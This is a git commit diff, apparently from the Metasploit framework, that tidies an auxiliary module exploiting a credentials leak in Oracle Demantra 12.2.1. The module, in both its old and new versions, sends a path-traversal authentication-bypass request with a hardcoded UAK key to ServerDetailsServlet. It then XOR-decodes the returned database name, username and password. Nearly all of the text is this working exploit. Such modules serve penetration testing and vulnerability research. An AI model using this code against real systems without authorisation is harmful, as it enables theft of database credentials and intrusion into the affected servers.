f3299e3ced31d09e7431279cb179808b3f73e7cf
jvazquez-r7 <juan_vazquez@rapid7.com>
2014-04-18 08:58:11 -0500

    Do minor code cleanup

--- modules/auxiliary/scanner/http/oracle_demantra_database_credentials_leak.rb
+++ modules/auxiliary/scanner/http/oracle_demantra_database_credentials_leak.rb
@@ -15,8 +15,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Oracle Demantra Database Credentials Leak',
       'Description'    => %q{
-       This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in combination with an authentication bypass.
-       This way an unauthenticated user can retreive the database name, username and password on any vulnerable machine.
+        This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in
+        combination with an authentication bypass. This way an unauthenticated user can retrieve
+        the database name, username and password on any vulnerable machine.
       },
       'References'     =>
         [
@@ -43,33 +44,35 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    authbypass = "/demantra/common/loginCheck.jsp/../../"
-    staticUAK = "ServerDetailsServlet?UAK=406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1"
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri("#{authbypass}", "#{staticUAK}")
+      'uri' => normalize_uri('demantra', 'common', 'loginCheck.jsp', '..', '..', 'ServerDetailsServlet'),
+      'vars_get' => {
+        'UAK' => '406EDC5447A3A43551CDBA06535FB6A661F4DC1E56606915AC4E382D204B8DC1'
+      }
     })
 
-
     if res.nil? or res.body.empty?
-      fail_with("No content retrieved from: #{ip}")
+      vprint_error("#{peer} - No content retrieved from")
+      return
     end
 
     if res.code == 404
-      print_error("#{rhost}:#{rport} - File not found")
+      vprint_error("#{peer} - File not found")
       return
     end
 
     if res.code == 200
-      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
-
       creds = ""
-      print_status("String received: #{res.body.to_s}")
+
+      vprint_status("#{peer} - String received: #{res.body.to_s}") unless res.body.blank?
+
       res.body.to_s.split(",").each do|c|
         i = c.to_i ^ 0x50
         creds += i.chr
       end
-      print_good("Credentials decoded: #{creds}")
+      print_good("#{peer} - Credentials decoded: #{creds}") unless creds.empty?
     end
   end
+
 end
